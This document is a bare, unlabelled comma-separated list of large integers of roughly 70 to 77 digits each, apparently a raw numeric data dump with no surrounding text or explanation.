21685721078976945602014626559051952462522937081933691461596237088189849657600841978193227429482306484131038624804443150311960061590035031144063153270840224125769186685588909207004132946200580900994078282900107456593588235003169921354, 21958932659990459795087732047584541007461325015275566949343681883128871386631056478783893068511478481080998508038344707524693059394150326940234855081823341566958854943322931261168562807321821084640569487228751077318094170704981650643, 18575326074968673858478938102428524301651676277226235867758079277741745360252102636120213638047957826270155136845469846718570511376252915803608625919614831191687134838436838444619000754054647327991321858217571418142823485948838843485, 21925408319719932198647415634718243407859189936679904356040860926584581042313625039619815019247876519120113207553707089727019778893587018690751305364116444902853587524322159019276550794203235986634843194549273092242442491313448819261, 21971769237171245388162249651275023141695912811218668240216220140957909617367793495291879198350993947099136765615466319867553659408044799043226321654345805093608432328775587162697826122051456089057951721736470156996789589476553105264, 11663665652950097951023874167071177053010440547278309973779798672676245675511213044752231769369800098096803991421401406373428185323198016967614776368177594490205473987491609921616943160817435319509156480489438442748695594208064506220, 8571733767532539591744305084238785438241372113715037973018068103542160069189369810177762541226540971969214853589594936813485292570840550755458909361226931687465304387382031888400449142008298116395068621612620111710861173184866936140, 7265641014493092305952899792692591083374900624337072072988050601814681241595404157641546803250164823540836286168102490427911208624069282838605171970733970339707601992725288390921333947799040016958678972693235850470014270495531454783, 18357683019971557309259589537387305852885630835264669230196131340413934504145103735168294472683744065174013315114812930463567210171038311927245433959034948205776155437226711665133074869096527958147737755278545942090787842643719386293, 11249630823936690987701184435328330983163223168635101989339377911187086984695870497253721111980469167097885275676200751043669504762094425614665999696903436973710297025883232331081137662411660725420763463582758176584701928482618894781, 21368417704130086095517329969849814675572842583190085389984103090985523417424304950647847490274582711171880575904265538743919551938416088883734546870704471113682032872096669715559005389583617506786922899538736534449123490145292870717, 14804820832711028510069420293910842363490984270818804823036282440726358025681287768311485300453811070788732988003156703771994750175077965636968452087698951366737342420716417627361539128824909909441296599842507450408639167847785653915, 10434593401661546638239269531721470859924069355256379358171970711096840647467279929406877589003350835919284031476862418858161422460097377292030151489346187334893502923880428533662123412400043690091517722265611541955158862687687083713, 24561443937015608720032402685089937637576551127866411331840220467266147984636152386876296689017192384827778734671122241130228223938051376943961096583907106197792850273311466092875658575488249813416281385686228639897799476137433072794, 18809508978562914770986641825424844673983326011247074637810890215219273029154108492496227431003955064765815763011903046546663244351135252376892253084070542641533081339319510865846592705413531461782231583683139065833462426977193323114, 1170325200926282785717575909542245218787696779459745550244912972650806869414330169502410895858680097983058617766512675739980564138645468322689195204967563486996177593733827238558844633804910336361508567070012845430162557209140318922, 9099530973344423583417798796448265698513331818761124724904157320649249490671748034442773080315290728734123593584766820587431677397350547048991745367397003023697063690573732401873466117208072387527262379544046633911232863713321651057, 6186545629812301877416853524734068114160450574994337117451587850263036761908385044092582990344042147406495912347645194115630652437606943173745789382845771049426443196019424697520894541338185145315971072044570777761063733877553713897, 18998733646999927412724741294417250892695086218116871981646202453146130670287277614970454171035798941213673467661889691048080971104465387696449499673490777958698659977825222598637449610957807490964624239691466685216040180063226979122, 2029035413823102082844939452656558074099805593476575872183225270283922006193130394920312821210960344438963206668816623318138806516660963226561860797911308864515985218753289984687939495010747187617345807068432674609822226022395002612, 1224334924830478941430540036421292246508644320238722677095883999889500298055876272715003687287887258419587507272093701524018402394087314059455381046013880303534485492492854314287356722191065404686438496257734600194353825409365914860, 15388830123476635874371535682309831543921413772062742670104698630978096538706065152811565310857194947646535508434358944071335015150277106407625487947363537743602712388716945337353159986787039117453435890006787376090096478885097896793, 10420053457335214342250034515332590797688043330675602278978659239127226996657084329075623919952172290482707420754415548245461942799120532008714972162634055331774926378534698291836555381029033314988303673575302329970048819875247229179, 12996570101872386881673806472032213506289839322758639432467242407197962401207255061640708238859358713382396645910306730272104173292864961862992132326434563495453537396958298185516874532647829493332700756725404634790257544413340701179, 11310001007421937130740204981515298136120181111962805563938085404289034278582061516301247258497064123414338657565189590291572623864937738084898059354622789358315367559028252287238789841719507080364615405563645390035528060316587102434, 7649920628929819175111413039486903286582015040923724934131761955991728816695088157076979052445031028120246103984026955901706105551535103282597498033031299709784514740469952209886314525277234547727841567842751063166501691717457807447, 8282767661876353703033480225670583969116738681062155629579190289397580081693316541581172493468366688140769336848827009811751348916039495262878858557738835369246631011150499694799485418164185557834866797870483707948444235231858169626, 10348065215991838887653401510489462098163485305574734545999066167894062235647455464256295931687781439097474305106334560598277885818537337701043155862614830925253569580192693898982318220593792046251125806231585329780902132617095557605, 11280967838102140047754377333560306350439648795137561969675963243081381329614099288939779782707558436465906221877404058208128414128559781592656246480955369758626788333375306898903783463959673000218175927160948442088191543414186131128, 11818929318729599124873943942145086021537273013997542692590943191077407938431043519607803418206555258214868688916182982805626078211252859082557253484889098137542929253460999852448424761935728458750150144937944771790308225982842690991, 5412969967721429139669566091956620099392941108847901064147423662180279827506836216754081912452764251675143575201910182189452840950356093575193249038624088662404268095962548749560674786705087512264668188729966989099888520624252744742, 17547356830409485892450749625199098509352498837601257846778404113094407637374346871392480581359187302653977880177675827091282945951962337410850311708191191160617963235512211658386260536823783677847875240999663432436509923589359888700, 8591887831833320840353196012263813111833998698446912587048628554388758958894496922493509033622609997670078612331200032453354380661501616871254995529921741954557910165239506265116743029658460390005477758921580324576966499950007047698, 24240608152025765890027400489331384103622640389639440068870645610439083379801706312111003846522258870692561041435455283169383633954853734692273153399247032151636823004018903792154640252253321042038217671452847628056591095001306376447, 18175238845322126323124732491839020080710712641999842067614816417084136046584647549081884372712146959940542383332663098640914320062272677772398521802893135140152503676658094543636706418059620569628737841646560680792630698212823857262, 10173862342693636575822816691492648273969020863129335004286001570695771568655492268044889845820019987659485915423299727906247618142386037838017456563194751538355466980296232841821674366111391576715244751705262011350337874749069345128, 17662887672308755659019635470333733858782416229711314422114693688837435216071004353298349767965595195988075045297248229654838457705997370106886962462023530886801849382037053188597909092732733084276903712706650614116210171460124448702, 12181524874770358579756085310138062154649043402053826988100381472344586613507823529632552464702544146652926312223695774383330894873770697330113566788363326971512196767946895811541430690548268356821209678371607727953997755838859126774, 11706994803516619040652442122624584733481017689525911051638928911326046116787740449573218360698003304996969933288041344857060888292758795645873721224079904632765180343552430630220956988207594755397804226083803193344994676329154327493, 8402357024978800071132055381314495648044905341576271257490683211086187354513127161690622199664304716824213610566304398546880266690789434430387528988209454626947248456097541304971867186772981230342257502227623573405137627210448823142, 13448814958668457684435846084935312650492724089658173841576258956348433114343610821298085173624638488238498589587758466360130338576374710075452327343150526934585873779496035836251602780112344762888078216555506331950896199565104006397, 23261851067858529243006512692328544765212250343687275283881011048369283487674444025254618141024372715313068675809489228084809200986696814193106301463035744067133170413056991023684452021013779169832348352784939483901536220423645197942, 2956461782787803412373184373521537264070982785668285831540757975387873992581341347760818916518443181764106275140479051787993901624417517942973131286068209774333764601237951091135348213764981692825938722977028088836454760352308033758, 3064486829635307133829604105999736772476219409968765985793477839736080127528728977191920114031725863884495929381858399046617507423360505816138935964152136380493092256651231150405966672895186096713142246153609317333657783049782151637, 10534802040612029540164483914330039254596233735171946359486562702340646071277688198935825397890574505178778613602867388545647349934716384895425051636497444634355043931879515977147131722039200347425808771386164417873392627039032929381, 16347587561440747118213871772022312563284652196262767324725458541109438659123670691624550736479719729504505614345452675461481177780240509736905011159885741573570625495043362505744257188005059869496076647939661464052864550390489436392, 932904564223742245423974397013211219322210230063409757135997988238048200833511900713764471854227396545059725844299953686973316362284758928784205613692959818986324717887966604059912158445010080457313116226499514698345116888739045201, 14155784829547910297069256239291885565427894076067719732956480982423435038774293432631990332881685973262975579857568134342058023430988483873438365184934853154265957089486695576174902453654823300612278786604052983027801579290159697757, 15059083507189045339756950559733288471657088114328896031836676598008347915133424684726963231247503783837186267424615012969099328203791879946151584653751983269080942728473598803375881811206929641186341006775658793858164370672638305414, 24050946955204789955533896427147712239350820947048633709193663894730552442910167865457955759634279229427681904250200157386924869101980949385253708656818328215342828689475987104598173819168455976517935776911361022122188385844429827861, 19717014416567816150124583987528154859466839421475505938275277134544233978125970101441724416647563320808697850421129369459770642837401448140038995613160278102100098417142249160683605942010321574730955450415122680160957836958254976336, 18341739025196342781439155614541180114644324261593971049987391428771657889467166499305558227635786922038300709465635665032362788821657236521443750938108440264564014080412870675324633423190226880338075753190002816740212167912541667386, 1813015948270605170494327027462767927668238016932441018204770850364166891479780348149629127108953561818359981896571545563617551207948156571122643027237671390832571624849892766565662348404168867487258425853064191070395435566239448528, 1703147790278812545808919311803253465091977239190220478003554114391300310923920435402284572213975190078137810042295522772486405957891397177306562281878529791622615529533777964508592563167873221257377134938914666430743351377618599468, 6278178489775796378230960195168194198865191514369599946855978876059738107235833955372780564515702681152913705996119810470327292606622329414011316101619726547400486206707034436148811872252943718668515788898176009551715308155411378252, 18502372570762310433863217616808095626038090932776074429027848581566215187912012261455455254801851855136832053610149165093284302575637475929697357817164914767314039550045344473538968895886764268535726243745335200504802864455745224374, 4619546424150636720632675449805339943017962539019526400964585316199619112511814181720051470848623690283063163236111719759442441616569278847685187351643033457613638640496754781862046330458169376039112280170067629393555816168818241121, 17415120259263326575917785021419190975482450501413944929888356972186654579803176474572508975215766509194009235591715149336564009819560581298723878336153312453947335918616023490225580430289839613029201222545734451097726880722839921382, 8307522287111865592770453226202115257484524653842503182672038744879218056275899543441543776625702705787596409072729458316533724848741039140250187914824007142564158445077159333307590448478263879269330063036285504424990516198257896295, 11263353891678243397276227460314841929873607735065191631233072436184881556807080115175345410349873166932751571268937511388565445447370133162623474541842794012489039636114698489895111355542309742024144040488016432324050920900295291917, 22637221521096771355782848874319356640240782235023169163186886225331051134680206995051142472351972293320891064080813070515162355530485444273200297804821736770540507890630957957945276656133277989360715398965382403686702660132053087389, 17919419877135534987371117199483506832865643179065513875403972803516315262685396424216812524399278928565319596834323499540921207386454692592496134156868095555234425205678332118842419128184729949597616863672987401083957030450961088118, 6084785464319055531520936804008603920136226720135667541062857654162604072088374635967414294340045316322725709290667559576429084868775969096858901672894136646463280390764523549103315360820057333674907169174163429153014379285872747201, 22582646848247815349822384029625982294969862652773702071458460690402019599859783915087863321522598200340080081814722953057928887642522789124256212970552071481336495429114943130059072461748175646464632989698260874422879732797887630047, 18669626144014838256754393744104130472295922668789204770557829273317529078229484347843108989561950816009995418160306613843824685195742442008837587483298470746325730371307237685260665649724430226456422634290254179870262594544431983580, 20052406002140826214070462061355742833483311314204273816436922246583813045591993339752776465796599006048131075796594497697843310687048655947142956234427753793119501583467069339507721514048187534341243065632056453879312603380628033984, 8536998978578217458444546841067601712321613656238053987413723752276637535354443999372125303631295704610057669756260574243930397078353340155663182523975349073323122272823468525187727995554596366377566035875710779754713058741421952297, 18434625855226899883321256831367130395454266215612264702708075963791303925781592538547918831568109391525493791354981671339894441519904308962763998161987029013446729670718008148129133450351098070931554566261249895846253603636590459596, 4836589882106604573232223783562904282390113141134832184116904820708055678518566213625282539739120591243833386887356618441208163640057659125158988736716688790394207262106963544742980383712576206460105345350538386057072108474044619762, 6151404576887692192610418168194331069192875548920158964829022752513950390283339567156423340910687221576158002429133456052555654098031826362939557645155801837456631388169151822830860248697122438884510698830753889483429000372055663270, 1574957139018125716198556939124476979519175929549560352017864438659995599753619766161008956285299169458623403378359963178580562501544136272165783563207087197050431991062774440640781210997705052555763881548707362577843167934254303211, 17391739152895538066781672275956234672907920242794599378833168697429044919890739257714041398214783661258560907470027798397029764878415624758336877129671514678297353821687758143698229059859378874838953846176893688321578130610211565286, 22442775423196539068158317596467259088950472981582207880432855826287481502251341833382328178251544577017724250630849093658390304250535679234308101654761044939170582837625840089519904382455956192527790359472609400260135910142621984804, 7748145694686025228235215160750244287356340902395751036047680266668756996397350960420787060972587276915359606276766739777861347852878339037039524614848022448512348644599427802285464351651684733130472167279398416173868476456640343912, 968331055615348886946161174142596323259279195401290249125471421855394873300085582575869103540417932149745449924520552363175883831558583706411049245922455751591766401028527194162506783887475373042174297269540922518114299818971515732, 4074196420936964179766581964556249617600508808814880297307983370447540931003863746901029660929911106973066021649873857071560682302121391895434719968587180495592648327726491322805723227506930292583988197314499826859508435423130136511, 19864987974362234107843653929873500108136815262278445784737257026822472090684137983310497635654575899271214537322575710548691021536061053470964176925313591634748257211956578723604063519794172805717329303553656399286725199286782179098, 5980232223078727426630626502373985853071880541561981005218776841139298756434767290311430618487388592202253565417179231192022611316234657898418924157525655172678865435399101556073022390243434214511995519696285633065317753437363140899, 9821319966095560427870562540391515794742864976782463778999916398549075070208007164914970520077561657764076828409003343933376170855999484408246466687946900127907046008389427535470321658506118424459143900724118409798821454695603532413, 7827061760058169599128916445957168975571796630781465189931078722702870872684431267074675693818964100116677523139537724577680225755195092012197924786849023733994256374790421775024816070942174050947871976107979562435932865310494883087, 22444668052197480392921780325089923182285523366742407483346175183018618880471398182443968590402259809874065978185849126448188342895030137619253767196685974598148578223227750661256523638369688545340957145235941267699205041015976512893, 20917044400441994043876270524213483352610260969649420453302372823720482527762724079002988257467288936795890599751896104615953448223734081092408051311403775183351145101060024221646952031995834916254264079757831184110975778281092887507, 23140912538412009642128425132684342938279634667238702284276382497865489723993571612771587585503991716334178974558961918251076413896005571217843917697675846778156724083976226196922651714668362270739315887073416139790810854613161221205, 22777946012556717221075832833653666836629416861635512682775171879258070731828427066106777275170219181994163961386136705459389933201518366302644543778363562846466085257052188326159339853787923581481741947880793477699405480147382158494, 23851586262216165721855485651763540041901511489076454491269387584732596518981375859161694969885462872348599346737087824666606523489542019629415264018415534655453799899565276989370343113997814318338527314054146555972083061531585827540, 20241416376929699761750802558413112170873703541929048761197148717657034619071841172624649616126693643941848760178381682942801111935776714336673825991096083096572342885484491597788757271226301779632972642169838769965985177058217188038, 2692623658541928573101809574838111935515631623595566809258680332737841700723177581136913483180407761165968252907913185839978546543265283140651614694449288264776969017249235506292038168449124679820126351493857549856356121231151653092, 16131290371505918809335910442479495479841565683249366748358361988494535045927568460325417586137766570965946466933319709361295018081273755953428838543656376509391831612977590017091825515705947022941510609863748269022738241991112543488, 1335160611734517210645206538933135972937544803451806751759630093284405592061360484816228430621641176590985805245868699739008511603795763736239195005005100364118036164638319077433065549088587459341808702399982456843190373618829758380, 10340884655343139837671785768186602936214734136755477567866586190929922502684799328216935326848576904458087728141043911084892486564116287640011646899861462113035901153299622043759499282128564846901160241967532876328459689814413762415, 5401801998031885667933094843069088272827013350970253067554899772704793572618267277623489486460813952487852750203234532174602055095351744072948091510037938518921258719623872400909307218937680691436513657947420608446304518643433543806, 22418868106953255259925166180079659279224737549892921884878026172626266645583784111270814808165875702359326672598830454977959663875880390431168563609899967914132355212711052456153248630704103482626553682618348908416775395116183421160, 20136816925897836048772212824296976042694611960736454057157846271343943360453902970773845024303002259554524096897822838253842365660027362116226399377625905232718459877264554224090369414896236479377060541879764953830249057877045251555, 417007008641601538653131077937620123593549306092323725176317590989242946892864900660489655668904173115128836432434611768470228830641521176358301458746585411902484062496874795344596497020100855878780454061487570562235412769427686317, 9816475565441529661291824775139176002345288049562161459635217819610547571837959753097093100495711176071908644218955109371081139417135838663380195844736613456931438981238662973400611171398897919439637129498647633743885607728861261845, 23870935413324621348274921404095042947875585668987906695837586539050798799854533446390296432839375770804268047327372595660396408173256820274722381200344879062334763587710033759647191441214875827380395128531108963710853637847394865713, 5298283449173550237355629570588050847341460771573182634769894887770904533264599629995486512196147997419360308122234130045379554651637311836030578449665827917483073270459896882565258770161952823438641471340977976030370479284643371508, 9100837458325934090298687047369486564792435663532832334039514867133941164867094239825017906066058129874353079407264039259148505190526558442923936093553694722216375206807028548669491820363396636679859686397489340148773407722045937270, 17038367322359956199612085432647045245163774933791813550948476894306406589837225702818847799733173871855718021202472793156228757158103629792922793811988464842161571581127798138726439413898369919443095650665934234847679938496501082548, 5299931840319151047971338206132253854280031927943516805614636255095356530922613677536304699331683053630885588152231978881663325811744339303687716269251042135117691288866254176400980454233864302175455006617533230769750479680704003803, 12540635716642138050069818430585456163343167481815665545278957523114902416154894156857128176013092728156227339170914675236740354318471661079175938598595792244472546173729361758589747726406890065450274035377585868728685758016648252277, 20322491326674638034817966107240137846880079505122662915547658066684133128524680689280031204806726531719600178717407242432128474388718978132706799940782382379254141734042970031880774214699826014425312091260412469194792303194943312541, 5229662284467342488041460575057606427352459717204043541086271154843521129291284032127069339383360917307751194492229261239447923171449428855700540788480851171076934541793501678873893328468428087126295294243102629336566344072435148926, 3285838812530358897545298545597343176030011766358309208184051849657687130054651377685203521819371289947496722092598297091948769435961363706612789578094785479539087879764936323884232849776769800582357588276204554212787884397356609075, 985977908000415897087132935158491952560421294051636567544225622494066414580751745182595887079757589173529845207284035227594010385666914234516531594517789212163680139291972549513242975229837531367529730153966350998393964527190960780, 17065146968215067842383191941447787644924233733406612558491157934810641836558863455012704342178343064915019207439623922379811619035308569771475626867167513169039770149329185353910699976605853826239989744767067695675074282642081109122, 2895051855443032500114264954131824950223016860747135906862021873334133780972247856024289082902593614686234940918908254535652058807083890041131819711987908379837879596740736424457497974785551048832507207236105596543909624181876322785, 4966900790205893074984989386646008103784297431600598682180814393416207374789387128394225554960559580907084765584389900080293673527269787068249734379554225965935987198682993924271078260562548541634568301366120953043703261984185035492, 1592133000317447857415093607791358078761029097913126706492340352416015371109359886156333987922914888082815145772272973546014967400910445408277918663315594917464634596929536938549199769536365664240519962382595777686556467574333228524, 17035537442662976504922683848715751125264550470049558142661773195755584861517729792053865084739966511957660313727319368149881218522960763762882305808684597990343444747248688404053255935943475864000546643886973794872661260510687280843, 20111698260990344511260405765344080240651285550598954249450996243164491354537997138010932667983387259244493313206064965234304942238230370889100484896673506193390990108890409994241977323914015682399152387423870735159707545233977076770, 4426576652391016795551419713890251009257497077843566944171223794376085011499334139845631881967064569788805218564609553883159372200439972546448048186839777176955653678061337638263702524915401358923560309463124850203968200337852733276, 3556250500712518687819416837629333029165286228062203447561280347508137816614314590932355942707292725328412737236278928580181418156388443710572944973186708461884059491603304783359925238797793594138717291455747294198397870200166947926, 13927320217504747590335052600456317522959386643781341454614326945183478241960544334007376807495121099323703009105189096866855842836770860884311107587040596788037191865762444816790052342380928760217895549688851330716204287404367303487, 19186706038001453829669717777125450932916146002197133081093772142153667138769734136853279989523987832968428625917578008444184262747837927970709245398651581065254203234844684953377568872969107656958355470030477893423131898072422756183, 22381665099391547182936913521847282760348471609353024967760382743808171185913404603975224381726387826288857667025325668082188366555603105557245157448683625346209348265965221897830928437651540759787451097803683602952136978886939848108, 23184966822032599428052602150557101983764751770509578032863780766266522607517592773626111822041493293258042973530264981559695260799033791203372990411009256833559380777212487382283059963062596935284684661031645172162024478226204363138, 16539088490461420703816947102632424948425515660257887809146011235917654678378412523179508616742234368055968310509283732191870030434582732164093099360112011742236459025255884663476536960498964609417125524793004880729910317951965592813, 10627113729566322150048832232683529097355980196490682036544275502457617404334634120165915692104820767017442741956545228542857367270650462946535492128265700535237871862208669509649325009158507616860442008149873107060741021076888884760, 11267125954054697421607144060487028030315221416724761783980425416225401414438268312062546288659852252620731439408156918787311722449792469512045947674206376022808235573921725655145722130002570628702790325686485651094520806647889697625, 4911205202815908515692837431520549683777169253252777007455111883806834073795531698553219580184313225825960948113399800474452261317070334272323032740707835989017948524378048478488428489385565965079763692393689501989320254467985218131, 18225583119089116078692515199163462711367659128624273031302797819688898542857154391879994381461943991555355016609793957171277566919134542789018572504987813438201233787367785338009025648567150953656694093846485220700745696812633035006, 17124234213957098698230284828489924705668475635880795070226911783064579553649755246615473501361642779526435236563455406701400112606551296644981809412927868935422016140603302419472851331702007217744308865951784508265319879878806395169, 18320622251591902268884471566945908729088619624449744135372454032601565510002933121047617779525906112324014260307172465674892213050531659488423104916770768335565948080253402637642044778885182266582275200106953222049633752308706688551, 24457930433564457945771787755968680104666213881444206925098794328782195040157980540838735926561759082225194223736014415351949112479640317187344000165121092686793374287372748091561901721804318156288437459491612736032622243568349516093, 22265804749164546901938171648091768389896829971403003545856878651484500077757482148788299901736948904123686203689202942240180132163143143705283033061770635205827882648633512344457848245098258829095489702543948367764867928232044824058, 18900161492491534779787443646293787626820709943533292051383245169379565231395076945117775620635775969975846765953606343974869577606827971998219045983071563019684594799478738283866960338845191273042733578885765920385538754923673408889, 17889473980262621507727589927197778641872127889134833323841551214539716290976451403348274752633422499728496096883243584042483628894269754398553184329718324889293596658429101772287592368674172804565689105678473019975243407244443523354, 18138536284390228585222991677635066336042468881007408937551554888609804713475952148185850060713096062490706359461940944964671776206024172923126363065585750055088818712488848481717124019308269329827427616383247328426589265783755119376, 6941686913634391288204116641020549765180362394639046952833583665887465570267538795546804523595813342836355168483856050240026251188294030485167045415709628881383778040727359450383956568568106721584184411199839996521253684993422751259, 22992006670212126764824193120058634657001604914414004734821248527368854522227019382280730391923555175806134471061931935927053165225097789175365530407921340026367729574881159034848504162017932940755494323686314491075117479953225503887, 18889844572592402977165311575773286867467454462925891168417511513423729217044120249821731533209860082071111083322002901596453361922574290712584585358411669740150626541648939895944226132920890088469550610507895808585359727591914206085, 6666655710468005649706184115723573365251462187673059249738512161994399275840373987561227970751250766584800647042039279477404087065060050644628381828583861242380931211664820415435317452066274782819115003184163730581681622864948821194, 24442788363614702478160454433556682777614538285899274650364570324147929577042693651515379466649305846727056159265579376386821157221997188678366720354117931257791747671854293025636726315130814360325435461139608811317126380758851246545, 3789221993484155913559741664728461223403980965496397955689870284919836847677745452749044838420054969057924618819059401422484788710618185075911294609519545068730398520559177215399107660641538049803271554736571292247686379194750320543, 21873850228341807328959395050233093703169880159289173724757394227136978403580890202395540529330163397068220942284403794709107289189710029361455418998025336530860787357934895975567129810177776409058257987618326850995771554675384004597, 17536041541204934014076526920758665113043740624193969731730744258387807070596104489532717517216000563908854506010662434077584634386355186944716702706942442940731251780893620899779245846595551333147659316055919062256480970701655279627, 19407120068778690141403380026131453596861551386369479396230505390227653872677134054561992820557367774198282874395704720779245370294312934155682385859613278432890305085004312799356060179682815696304771052136896088704751922242630198409, 22188335278745941318611538342309792101807036715704960353260517879118066222777745210659900238277928630140699521308316838275971289200263131258234641581549364021537324405919384058988041517229292916261500788540253262281872145817866534201, 7747714826763088285107541247818316037397421767027668051138855493363116460000955397824452361102671411632490114848836371357604866226227424954470624642731987025316172767218592207709740356830011790713079523783872784305872540656392291746, 19887371972318133855851604678702556011249418604536222675471406387964064156556715238854177545520609871225101077916367584660715220549065088085292416996064161705548027357359433864169349493060754312050979210446959542252897590259359350334, 8294906413533132168404300931946413998240080166871907188094515783201644742263173979787881022523424957539034934314850416306063309934742997700326726155063016581522865298074769968348111017554707292410938898142597066728208428380878750421, 1653105970991953482899537672062357513065378236063390275343931334625408241297427898336232902361937430133831999674424825099913436268711104010735434651657677108868699978197850769122830586350740906726462895350121007949545664795947860864, 12269618263727745774471362344937708112433146558452944102120330036342787834859494830666143669909939653466690789351178557153188487424122505279563071471514459806106274249298197080596758790096134028357329959992410153187970554647619693992, 1872864619889940685338328801003331116116324125207518914355262445073138404081944205799436751349615602533951192776172397206414216844642872435584612569950411851258148106436686594672345335783969547344634731455993264276684131388107925671, 4513749312512251880604514209077948498027702413440182534839908928178574977910770106795841023217134659344590190863364646266789330386820741397846745980903894024071570509233767128940445989174470003283523091184905302986968451776421561662, 8603337256650354725901662878660176754144664298844747341704003399121600657022664528563551640960916587386129786478309164700432759539464086939903495957787444834354374817296692466731788081058771312703991550181427467022305370277303346983, 23365631034822686706848861837664149512381852299460219050905837202265319818470354800644904900148269920728421546208860389463045551971738217073763540025131975146762487532728885828048839528343788216251920714889888039142680073032018209305, 6607639177853302945854914419510931096388217686583645225143255416189057140379688783625576347008665489422690692808119043773336416572630490641290112319256251209477866830470853168722398019123553430625117729213654554816567713513779344415, 4561566327415935118011554902890982069222860765432388797764984409579792338453618355071397274166466983322420193457204472449461675131240004294130210782759565785798599897601429158065284397449217928577095159769164431353199244868487488744, 20619847566560770217922342108991907691804433910319321142515967407002608932724027977344243536552779741744666018384832452860273148472189048802133349097819957587715301234453466408609901385057101082861479087744559457433976694471408546305, 22491152451840917724221614919594852240132461240517952298400459039237731967027207477770343934142858535807374120125597482004629528875275878346918715932552067774911528110269427267812617484848108111673621932638514453993119718582330140747, 6666474094256099454100470843004001323138491057011536304234976312925807717978405285549794760174974472283543425259849525001185866616280751670606879171557999380642875418172376311718234199272738593712030842861381513444395743918038821115, 14608023366653031088088792776473398626003159629342147637827411108620737788956808756326109569015343711267053685351058998420052502241372531064676603977272048298276216817941298853114867422633812368586103057778170425202194117767754667631, 5252337957400533023141552935190055167419769967624364557832824989834270839854871010838982035707949070995760254952770763066280166814341995798204623431763701829339076952532980539368056515029226923915153022281011140366638060437110366739, 10904306109950562384969710342212030523791112657561334466651023805904078236093287424426677767985064640606514094696576993583613088268461193986220871599701879363215462244945655373954510358026604779860047706432984563536661200078510932373, 271089870966054382062547940599302930208391511305619529931792046885517009708743599677262187984628732739879872484565903195651986883825927888971937651058489837590922157961189702574478434079284762530056683899140620405502763587815843988, 3829615989110076770296742506036176782165844942888782102108951362367146757383686834342989617169804679903591543207522172730554226315074929853710799018658501869041610918943093181700178445519770897725094255926846625256047131752654342562, 21027069518507812270143295031343563349093839199401621816244376936177926406132628307142702486126954172154048366960790803112488498869107125453199712698252176721555768481489241348715849630405805925617213192771837043429514738827417144886, 5881226757843642195966565964653582492820888457331393664539176000660786662815235967860466787943573661827208152609810786722095379797141818015319613457329828625393487501781946972038205996869901009867952429000678385538000284430630706236, 2521923938150189454600306942991910693184006998559434655516630180847991419680039647290350012029220409131874146647660269259895592069243379722647318881158750588650781231049664374429790092745270054520174713929014178340596950439728274560, 8758376499045186974759666603979237567667197537852772637677888896808075273558089282554848789332514021133259149957700137612055862632797830595621934651217892115186467411149352513292138952986429910931491409905668759362630065098560911595, 13191199724136555502957890679396614709016857839416803538397351651347130464502168341817424021127860042268678297183870891307490573812114364969054434627925544210247121163167379363424886928897494782573687523127714204264997876190602437253, 9045856550177265391220629158731617749010212836864098283122546582777883404294009743353817729777617793271710052997379493755741026807844934814727246295235951284912102541728263662595501946149955917048457614526081296501462068421827852976, 6459798973338438966900179181532933692034227569421041783473328776170587260589076396376191246924415837088205177319039971420829034696713874472602132191625410039341612568435551413702295547566220164641447295285720082107354915094875081603, 18130944169824976249131646693653229887900178060915303504243600146230275474872733740668972937137157219543732643704650107251416696945179838232545698726143250813322229855629104391962459755248646534545048139897036809559137651958948270079, 19433961868269193358322214141454667980688775311251629909509283331435001571001860372018368696521955762539089964314003195187700700564577856756527331858387859373880454698968805785663462845204498347648129595364259940616740397244612865478, 8454342596590308643274924755539741595287236546135227564272399966865185286500856241479821014846217497777600310284414611127622114813445233725529927188907572438103992229319436467881065607514441060358976822819421059737228474840057614047, 14537166469005975467747810118162809545827718830406398577270708204918464068241632461987018145489192528509346426457951388255954213424031104985101166216842931291037542011588336951147195358280734815984408580846906869482480502971976426377, 9864795106799668524939736197424521439591891686815014975959473174387504259559952345678395376176078540246526852734596130277519239749484404961484185022437705083689017218701798637167021350243461787680837042187852481891194754984735656290, 12268133299486497651766039892370828813185008783433000037986132221788291415226868620238438503015954126875051172591613715198127704843911983953450929112840971801607634064818730678605607306766453120283358084710064351726230220427399762639, 23200293260215743474524683129751336070441250470963131048954888782126750470082228197816325916628408311922916070082220789486560209004492220118951431198612457889003386630810956350904331757934144293620423858054842692246457187748735062656, 12185058234910532038606592923943044720835384475056406568591532299474530796146503312961639492038042022391680648709583314649821462809663154713418981695840590138378051933292810301094804670835915971975595283960175012458013597273267021942, 11221105904027102766755866944349650081668300046041215931102172400146372526930032156540201468901690818353993076628146864056758574315777576911062494908066762717748155624173988281018555785467232120361958052665957065342986661851276430394, 14146479366643851658329966290610820831402901507964825251479961487541976561960526129163043068554159234344763780262866371744837633699714330248498751352953049997609901897424160840833140698818737335558582310519215832295749211043181569006, 1996209659684880945362862072520668750990547266260431838906384808543405104055069952622618300300584240886900690277630290717169515463002827197894865638271520372178286783553830032501282265213469285397161533556619830350317766403742420992, 18745628006242526136845741349836299919853199739283471770759301677399688289987875667803750091491715203157411890157519643639106751973250183741642640909721507627190884945027790857100678267316925707699884380178101491613670302697083954620, 19418124148220580953761208919068176633948651831328159315391336734636206569887918413082885761812646760978293757398100953133069513030393015847333774689093510445461709841109234535067235898760285824847288504459882411280759715216659582800, 5205682801846809078199714774495380248428185583858806868224581963484209052697538736798790170636398029956181045671089079103657022469597301960581764542974628895184611312183649377529274963873896667201796079779944709584465505596525070672, 23318768639095847871012848772328512763678546109012363992365106641654912272868317312950662675004405062658308032988874110659096548795362930763210615993811303468541570030170160830706399273680692451111580339813777985874728526448601728258, 17663789897713399391329553205656192714527376624862805232162724262629896080514601476156211759120575400809873039830798687701631183863013915733500151932198747020557039729241833096695716114234461112493415456068786767133227958219632605915, 6830010105417894382101110089036680793557109559922111774917409457675491199721642329811584508061936118348231576993991198201242451125213981421233318599225362440072543796138016876550674700452496965047853603139044680407212592626251990309, 20884460900376572824292657271126142123485873790799680755215209134586191820305715480424778276376315900396541154319924699294552460109641193882916333508408848926700539891286011495861364148628583978468945538773985039022758906702197824639, 13531065912700180655643696503956611973995564881435960456381267408672878851671401491817614667804495339344405932207053507762953305764605332944268933111663238888239497791369102852051383458023784915387358708364653218605556527945192953446, 2553816611900270571668114455889943878175117814334437639644905418648197398024478749479929249928897268004570330988939190446533589567173538978234848074204808696098346906993745527874980173125711310145943264700663446068878853419141256703, 7702946127422572691818763664478853337162137782960611620730689560076482803756508559755597150108497423141643340665369251108221062530372412417632117367040091322406174387044200677890005382248858884236589435161310662150368144113087162028, 856622736471280804557194626008729500444312593564382589268324938301776962060843602449805587925812237957752880785112568949132663694077910582967771689119118364920441406196093341412299290918890444268129746265100558792934176787213952281, 